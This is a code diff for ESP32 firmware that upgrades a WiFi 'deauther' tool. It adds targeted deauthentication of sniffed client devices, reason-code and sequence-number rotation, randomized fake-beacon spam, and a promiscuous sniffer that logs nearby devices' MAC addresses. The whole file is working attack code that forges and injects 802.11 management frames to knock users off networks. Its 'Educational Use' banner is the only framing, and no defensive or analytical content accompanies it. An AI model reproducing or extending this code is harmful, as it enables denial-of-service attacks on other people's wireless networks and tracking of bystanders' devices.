@@ -1,14 +1,23 @@
 #include "WiFiAttacker/WiFiAttacker.h"
 
+// Static instance for callback
+WiFiAttacker* WiFiAttacker::instance = nullptr;
+
 WiFiAttacker::WiFiAttacker() 
     : attackRunning(false)
     , attackType(0)
-    , currentChannel(1) {
+    , currentChannel(1)
+    , sequenceNum(0)
+    , packetsSent(0)
+    , attackDelay(100)
+    , sniffingEnabled(false)
+    , reasonIndex(0) {
+    instance = this;
     initializePacketTemplates();
 }
 
 void WiFiAttacker::initializePacketTemplates() {
-    // Initialize deauth packet template
+    // Deauth packet template
     uint8_t deauthTemplate[26] = {
         0xC0, 0x00,                         // Type/Subtype: Deauthentication
         0x00, 0x00,                         // Duration
@@ -16,11 +25,11 @@ void WiFiAttacker::initializePacketTemplates() {
         0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (AP)
         0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP MAC)
         0x00, 0x00,                         // Sequence/Fragment number
-        0x07, 0x00                          // Reason code (Class 3 frame received)
+        0x07, 0x00                          // Reason code
     };
     memcpy(deauthPacket, deauthTemplate, sizeof(deauthTemplate));
 
-    // Initialize beacon packet template
+    // Beacon packet template
     uint8_t beaconTemplate[109] = {
         0x80, 0x00, 0x00, 0x00,             // Type/Subtype
         0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
@@ -29,7 +38,7 @@ void WiFiAttacker::initializePacketTemplates() {
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
         0x64, 0x00,                         // Beacon interval
         0x31, 0x04,                         // Capability info
-        0x00, 0x00                          // SSID parameter set (filled dynamically)
+        0x00, 0x00                          // SSID parameter
     };
     memcpy(beaconPacket, beaconTemplate, sizeof(beaconTemplate));
 }
@@ -38,17 +47,17 @@ void WiFiAttacker::setup() {
     Serial.begin(115200);
     delay(1000);
     
-    Serial.println("\n==============================");
-    Serial.println("   ESP32 WiFi Deauther v1.0   ");
-    Serial.println("==============================\n");
+    Serial.println("\n╔════════════════════════════════════════╗");
+    Serial.println("║   ESP32 WiFi Security Tool v2.0        ║");
+    Serial.println("║   Enhanced Edition - Educational Use   ║");
+    Serial.println("╚════════════════════════════════════════╝\n");
     
-    // Set WiFi to station mode and disconnect
     WiFi.mode(WIFI_STA);
     WiFi.disconnect();
     delay(100);
     
-    // Enable promiscuous mode for packet injection
     esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(&WiFiAttacker::snifferCallback);
     
     printMenu();
 }
@@ -62,26 +71,63 @@ void WiFiAttacker::loop() {
     
     if (attackRunning) {
         if (attackType == 1) {
+            // Broadcast deauth
             sendDeauthPacket();
-            delay(100);
+            delay(attackDelay);
         } else if (attackType == 2) {
+            // Beacon spam
             sendBeaconSpam();
-            delay(100);
+            delay(attackDelay);
+        } else if (attackType == 3) {
+            // Targeted deauth to all detected clients
+            if (clients.size() > 0) {
+                for (auto& client : clients) {
+                    sendTargetedDeauth(client.mac);
+                    delay(10); // Small delay between clients
+                }
+            } else {
+                // Fallback to broadcast if no clients detected
+                sendDeauthPacket();
+            }
+            delay(attackDelay);
+        }
+        
+        // Print stats every 5 seconds
+        if (millis() - attackStartTime > 5000 && (millis() - attackStartTime) % 5000 < 200) {
+            printStats();
         }
     }
 }
 
 void WiFiAttacker::printMenu() {
-    Serial.println("\n--- MENU ---");
-    Serial.println("1. Scan WiFi Networks");
-    Serial.println("2. Select Target (input: 2 <network_number>)");
-    Serial.println("3. Start Deauth Attack");
-    Serial.println("4. Start Beacon Spam");
-    Serial.println("5. Stop Attack");
-    Serial.println("6. Change Channel (input: 6 <channel>)");
-    Serial.println("7. Show Menu");
-    Serial.println("\nCurrent Channel: " + String(currentChannel));
-    Serial.println("Target: " + (targetSSID.length() > 0 ? targetSSID : "None"));
+    Serial.println("\n╔═══════════════ MENU ═══════════════════╗");
+    Serial.println("║ Network Operations:                    ║");
+    Serial.println("║  1  - Scan WiFi Networks               ║");
+    Serial.println("║  2  - Select Target (2 <index>)        ║");
+    Serial.println("║                                        ║");
+    Serial.println("║ Attack Operations:                     ║");
+    Serial.println("║  3  - Deauth Attack (Broadcast)        ║");
+    Serial.println("║  4  - Beacon Spam                      ║");
+    Serial.println("║  5  - Targeted Deauth (Smart)          ║");
+    Serial.println("║  0  - Stop Attack                      ║");
+    Serial.println("║                                        ║");
+    Serial.println("║ Client Monitoring:                     ║");
+    Serial.println("║  s  - Start Client Sniffer             ║");
+    Serial.println("║  x  - Stop Client Sniffer              ║");
+    Serial.println("║  l  - List Detected Clients            ║");
+    Serial.println("║  c  - Clear Client List                ║");
+    Serial.println("║                                        ║");
+    Serial.println("║ Configuration:                         ║");
+    Serial.println("║  6  - Change Channel (6 <1-13>)        ║");
+    Serial.println("║  d  - Set Delay (d <ms>)               ║");
+    Serial.println("║  m  - Show Menu                        ║");
+    Serial.println("╚════════════════════════════════════════╝");
+    Serial.println("\n[STATUS]");
+    Serial.println("  Channel: " + String(currentChannel));
+    Serial.println("  Target : " + (targetSSID.length() > 0 ? targetSSID : "None"));
+    Serial.println("  Delay  : " + String(attackDelay) + "ms");
+    Serial.println("  Clients: " + String(clients.size()));
+    Serial.println("  Sniffer: " + String(sniffingEnabled ? "ON" : "OFF"));
     Serial.println();
 }
 
@@ -89,21 +135,34 @@ void WiFiAttacker::handleCommand(String cmd) {
     if (cmd == "1") {
         scanNetworks();
     } else if (cmd.startsWith("2 ")) {
-        int networkIndex = cmd.substring(2).toInt();
-        selectTarget(networkIndex);
+        int idx = cmd.substring(2).toInt();
+        selectTarget(idx);
     } else if (cmd == "3") {
         startDeauthAttack();
     } else if (cmd == "4") {
         startBeaconSpam();
     } else if (cmd == "5") {
+        startTargetedDeauth();
+    } else if (cmd == "0") {
         stopAttack();
+    } else if (cmd == "s") {
+        startClientSniffer();
+    } else if (cmd == "x") {
+        stopClientSniffer();
+    } else if (cmd == "l") {
+        listClients();
+    } else if (cmd == "c") {
+        clearClients();
     } else if (cmd.startsWith("6 ")) {
-        int channel = cmd.substring(2).toInt();
-        changeChannel(channel);
-    } else if (cmd == "7") {
+        int ch = cmd.substring(2).toInt();
+        changeChannel(ch);
+    } else if (cmd.startsWith("d ")) {
+        attackDelay = cmd.substring(2).toInt();
+        Serial.println("[+] Delay set to: " + String(attackDelay) + "ms");
+    } else if (cmd == "m") {
         printMenu();
     } else {
-        Serial.println("Unknown command. Type '7' for menu.");
+        Serial.println("[-] Unknown command. Type 'm' for menu.");
     }
 }
 
@@ -113,16 +172,17 @@ const char* WiFiAttacker::getEncryptionType(wifi_auth_mode_t encryptionType) {
         case WIFI_AUTH_WEP: return "WEP";
         case WIFI_AUTH_WPA_PSK: return "WPA";
         case WIFI_AUTH_WPA2_PSK: return "WPA2";
-        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA+WPA2";
-        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-EAP";
+        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/2";
+        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-E";
+        case WIFI_AUTH_WPA3_PSK: return "WPA3";
         default: return "Unknown";
     }
 }
 
 void WiFiAttacker::scanNetworks() {
     Serial.println("\n[*] Scanning WiFi networks...");
-    attackRunning = false;
-    esp_wifi_set_promiscuous(false);
+    stopAttack();
+    stopClientSniffer();
     
     int n = WiFi.scanNetworks();
     
@@ -130,22 +190,23 @@ void WiFiAttacker::scanNetworks() {
         Serial.println("[-] No networks found");
     } else {
         Serial.println("\n[+] Found " + String(n) + " networks:\n");
-        Serial.println("ID | SSID                  | RSSI | Ch | Encryption");
-        Serial.println("---+----------------------+------+----+-----------");
+        Serial.println("╔════╤══════════════════════╤══════╤════╤═════════╗");
+        Serial.println("║ ID │ SSID                 │ RSSI │ Ch │ Encrypt ║");
+        Serial.println("╟────┼──────────────────────┼──────┼────┼─────────╢");
         
-        for (int i = 0; i < n; i++) {
-            Serial.printf("%2d | %-20s | %4d | %2d | %s\n",
-                i,
-                WiFi.SSID(i).c_str(),
-                WiFi.RSSI(i),
-                WiFi.channel(i),
-                getEncryptionType(WiFi.encryptionType(i))
-            );
+        for (int i = 0; i < n && i < 30; i++) {
+            char ssid[21];
+            String fullSSID = WiFi.SSID(i);
+            snprintf(ssid, 21, "%-20s", fullSSID.substring(0, 20).c_str());
+            
+            Serial.printf("║ %2d │ %s │ %4d │ %2d │ %-7s ║\n",
+                i, ssid, WiFi.RSSI(i), WiFi.channel(i),
+                getEncryptionType(WiFi.encryptionType(i)));
         }
+        Serial.println("╚════╧══════════════════════╧══════╧════╧═════════╝\n");
     }
     
     esp_wifi_set_promiscuous(true);
-    Serial.println();
 }
 
 void WiFiAttacker::selectTarget(int index) {
@@ -162,86 +223,161 @@ void WiFiAttacker::selectTarget(int index) {
     memcpy(targetBSSID, WiFi.BSSID(index), 6);
     currentChannel = WiFi.channel(index);
     
-    Serial.println("\n[+] Target selected:");
-    Serial.println("    SSID: " + targetSSID);
-    Serial.printf("    BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
-        targetBSSID[0], targetBSSID[1], targetBSSID[2],
-        targetBSSID[3], targetBSSID[4], targetBSSID[5]);
+    Serial.println("\n[+] Target Selected:");
+    Serial.println("    SSID   : " + targetSSID);
+    Serial.printf("    BSSID  : %s\n", macToString(targetBSSID));
     Serial.println("    Channel: " + String(currentChannel));
+    Serial.println("    Encrypt: " + String(getEncryptionType(WiFi.encryptionType(index))));
     
     esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
     esp_wifi_set_promiscuous(true);
+    
+    // Auto-start sniffer
+    clearClients();
+    startClientSniffer();
 }
 
 void WiFiAttacker::startDeauthAttack() {
     if (targetSSID.length() == 0) {
-        Serial.println("[-] No target selected. Use command '2 <index>' first.");
+        Serial.println("[-] No target selected. Use '2 <index>' first.");
         return;
     }
     
-    Serial.println("\n[!] Starting Deauth Attack on: " + targetSSID);
-    Serial.println("[!] Press '5' to stop\n");
+    Serial.println("\n[!] Starting Broadcast Deauth Attack");
+    Serial.println("[!] Target: " + targetSSID);
+    Serial.println("[!] Mode: Broadcast (all clients)");
+    Serial.println("[!] Press '0' to stop\n");
     
-    // Set target BSSID in deauth packet
-    memcpy(&deauthPacket[10], targetBSSID, 6); // Source MAC (AP)
+    memcpy(&deauthPacket[10], targetBSSID, 6); // Source (AP)
     memcpy(&deauthPacket[16], targetBSSID, 6); // BSSID
     
     attackType = 1;
     attackRunning = true;
+    packetsSent = 0;
+    attackStartTime = millis();
 }
 
 void WiFiAttacker::sendDeauthPacket() {
-    // Broadcast to all clients
     memset(&deauthPacket[4], 0xFF, 6); // Destination: broadcast
     
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    updateSequence(deauthPacket);
+    rotateReasonCode();
+    deauthPacket[24] = reasonCodes[reasonIndex];
     
-    Serial.print(".");
+    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    
+    if (result == ESP_OK) {
+        packetsSent++;
+        Serial.print(".");
+    } else {
+        Serial.print("X");
+    }
+}
+
+void WiFiAttacker::startTargetedDeauth() {
+    if (targetSSID.length() == 0) {
+        Serial.println("[-] No target selected. Use '2 <index>' first.");
+        return;
+    }
+    
+    Serial.println("\n[!] Starting Targeted Deauth Attack");
+    Serial.println("[!] Target: " + targetSSID);
+    Serial.println("[!] Mode: Smart targeting");
+    
+    if (clients.size() == 0) {
+        Serial.println("[!] No clients detected yet. Starting sniffer...");
+        Serial.println("[!] Attack will begin automatically when clients found");
+        startClientSniffer();
+    } else {
+        Serial.println("[!] Targeting " + String(clients.size()) + " detected clients");
+    }
+    
+    Serial.println("[!] Press '0' to stop\n");
+    
+    memcpy(&deauthPacket[10], targetBSSID, 6);
+    memcpy(&deauthPacket[16], targetBSSID, 6);
+    
+    attackType = 3;
+    attackRunning = true;
+    packetsSent = 0;
+    attackStartTime = millis();
+}
+
+void WiFiAttacker::sendTargetedDeauth(uint8_t* clientMAC) {
+    memcpy(&deauthPacket[4], clientMAC, 6); // Destination: specific client
+    
+    updateSequence(deauthPacket);
+    rotateReasonCode();
+    deauthPacket[24] = reasonCodes[reasonIndex];
+    
+    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    
+    if (result == ESP_OK) {
+        packetsSent++;
+        Serial.print("*");
+    }
 }
 
 void WiFiAttacker::startBeaconSpam() {
     Serial.println("\n[!] Starting Beacon Spam Attack");
-    Serial.println("[!] This will create fake WiFi networks");
-    Serial.println("[!] Press '5' to stop\n");
+    Serial.println("[!] Creating fake WiFi networks");
+    Serial.println("[!] Press '0' to stop\n");
     
     attackType = 2;
     attackRunning = true;
+    packetsSent = 0;
+    attackStartTime = millis();
 }
 
 void WiFiAttacker::sendBeaconSpam() {
-    // Use target SSID if selected, otherwise generate random SSID
-    String fakeSSID;
-    if (targetSSID.length() > 0) {
-        fakeSSID = targetSSID;
-    } else {
-        fakeSSID = "FakeAP-" + String(random(1000, 9999));
-    }
+    // Generate random SSID
+    char fakeSSID[MAX_SSID_LENGTH + 1];
+    const char* prefixes[] = {"FREE_", "WiFi_", "Guest_", "Public_", "Open_", "Net_"};
+    snprintf(fakeSSID, MAX_SSID_LENGTH, "%s%04X", prefixes[random(6)], random(0x10000));
     
     // Random MAC
     for (int i = 10; i < 16; i++) {
         beaconPacket[i] = random(256);
     }
+    beaconPacket[10] &= 0xFE; // Ensure unicast
     
-    // Build beacon packet with SSID
     uint8_t packet[MAX_PACKET_SIZE];
     memcpy(packet, beaconPacket, 37);
     
-    // SSID length must not exceed 32 bytes for 802.11
-    int ssidLen = min((int)fakeSSID.length(), MAX_SSID_LENGTH);
-    packet[37] = ssidLen; // SSID length
-    memcpy(&packet[38], fakeSSID.c_str(), ssidLen);
+    int ssidLen = strlen(fakeSSID);
+    packet[37] = ssidLen;
+    memcpy(&packet[38], fakeSSID, ssidLen);
     
     int packetSize = 38 + ssidLen;
     
-    esp_wifi_80211_tx(WIFI_IF_STA, packet, packetSize, false);
+    updateSequence(packet);
     
-    Serial.print("*");
+    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, packet, packetSize, false);
+    
+    if (result == ESP_OK) {
+        packetsSent++;
+        Serial.print("+");
+    }
 }
 
 void WiFiAttacker::stopAttack() {
+    if (!attackRunning) {
+        Serial.println("[-] No attack running");
+        return;
+    }
+    
     attackRunning = false;
+    uint32_t duration = (millis() - attackStartTime) / 1000;
+    
+    Serial.println("\n\n[!] Attack Stopped");
+    Serial.println("╔═══════════ STATISTICS ═════════════╗");
+    Serial.println("║ Duration : " + String(duration) + " seconds");
+    Serial.println("║ Packets  : " + String(packetsSent));
+    Serial.println("║ Rate     : " + String(packetsSent / max(duration, 1U)) + " pkt/s");
+    Serial.println("╚════════════════════════════════════╝\n");
+    
     attackType = 0;
-    Serial.println("\n\n[!] Attack stopped");
+    packetsSent = 0;
     printMenu();
 }
 
@@ -254,4 +390,136 @@ void WiFiAttacker::changeChannel(int channel) {
     currentChannel = channel;
     esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
     Serial.println("[+] Channel changed to: " + String(currentChannel));
+}
+
+// ============ CLIENT SNIFFER FUNCTIONS ============
+
+void IRAM_ATTR WiFiAttacker::snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+    if (instance && instance->sniffingEnabled) {
+        instance->processSniffedPacket(buf, type);
+    }
+}
+
+void WiFiAttacker::processSniffedPacket(void* buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
+    
+    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+    uint8_t* payload = pkt->payload;
+    int8_t rssi = pkt->rx_ctrl.rssi;
+    
+    // Extract MAC addresses from frame
+    uint8_t frameType = payload[0];
+    uint8_t frameSubtype = (frameType & 0xF0) >> 4;
+    
+    // Check if it's from our target AP
+    uint8_t* bssid = &payload[16]; // BSSID location
+    
+    if (targetSSID.length() > 0 && memcmp(bssid, targetBSSID, 6) == 0) {
+        // Get client MAC (source or destination depending on frame direction)
+        uint8_t* clientMAC = nullptr;
+        
+        // If frame is from AP to client, client is destination (addr1)
+        // If frame is from client to AP, client is source (addr2)
+        uint8_t* addr1 = &payload[4];
+        uint8_t* addr2 = &payload[10];
+        
+        if (memcmp(addr2, targetBSSID, 6) != 0) {
+            clientMAC = addr2; // Source is client
+        } else if (memcmp(addr1, targetBSSID, 6) != 0) {
+            clientMAC = addr1; // Destination is client
+        }
+        
+        if (clientMAC && !(clientMAC[0] & 0x01)) { // Not multicast/broadcast
+            addOrUpdateClient(clientMAC, rssi);
+        }
+    }
+}
+
+void WiFiAttacker::addOrUpdateClient(uint8_t* mac, int8_t rssi) {
+    uint32_t now = millis();
+    
+    // Check if client already exists
+    for (auto& client : clients) {
+        if (memcmp(client.mac, mac, 6) == 0) {
+            client.rssi = rssi;
+            client.lastSeen = now;
+            client.packets++;
+            return;
+        }
+    }
+    
+    // Add new client
+    ClientDevice newClient;
+    memcpy(newClient.mac, mac, 6);
+    newClient.rssi = rssi;
+    newClient.lastSeen = now;
+    newClient.packets = 1;
+    clients.push_back(newClient);
+    
+    Serial.printf("\n[+] New client detected: %s (RSSI: %d)\n", macToString(mac), rssi);
+}
+
+void WiFiAttacker::startClientSniffer() {
+    if (targetSSID.length() == 0) {
+        Serial.println("[-] Select a target first with '2 <index>'");
+        return;
+    }
+    
+    sniffingEnabled = true;
+    Serial.println("[+] Client sniffer started");
+    Serial.println("[*] Monitoring channel " + String(currentChannel) + " for clients...");
+}
+
+void WiFiAttacker::stopClientSniffer() {
+    sniffingEnabled = false;
+    Serial.println("[+] Client sniffer stopped");
+}
+
+void WiFiAttacker::listClients() {
+    if (clients.size() == 0) {
+        Serial.println("[-] No clients detected yet");
+        return;
+    }
+    
+    Serial.println("\n╔═══════════ DETECTED CLIENTS ═══════════╗");
+    Serial.println("║ #  │ MAC Address       │ RSSI │ Pkts   ║");
+    Serial.println("╟────┼───────────────────┼──────┼────────╢");
+    
+    for (size_t i = 0; i < clients.size(); i++) {
+        Serial.printf("║ %2d │ %s │ %4d │ %6d ║\n",
+            i, macToString(clients[i].mac), clients[i].rssi, clients[i].packets);
+    }
+    Serial.println("╚════════════════════════════════════════╝\n");
+}
+
+void WiFiAttacker::clearClients() {
+    clients.clear();
+    Serial.println("[+] Client list cleared");
+}
+
+// ============ HELPER FUNCTIONS ============
+
+void WiFiAttacker::updateSequence(uint8_t* packet) {
+    packet[22] = (sequenceNum & 0x0F) << 4;
+    packet[23] = (sequenceNum & 0x0FF0) >> 4;
+    sequenceNum = (sequenceNum + 1) % 4096;
+}
+
+void WiFiAttacker::rotateReasonCode() {
+    reasonIndex = (reasonIndex + 1) % 6;
+}
+
+const char* WiFiAttacker::macToString(const uint8_t* mac) {
+    static char macStr[18];
+    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+    return macStr;
+}
+
+void WiFiAttacker::printStats() {
+    uint32_t duration = (millis() - attackStartTime) / 1000;
+    uint32_t rate = duration > 0 ? packetsSent / duration : 0;
+    
+    Serial.printf("\n[Stats] Packets: %u | Rate: %u pkt/s | Clients: %u\n",
+        packetsSent, rate, clients.size());
 }
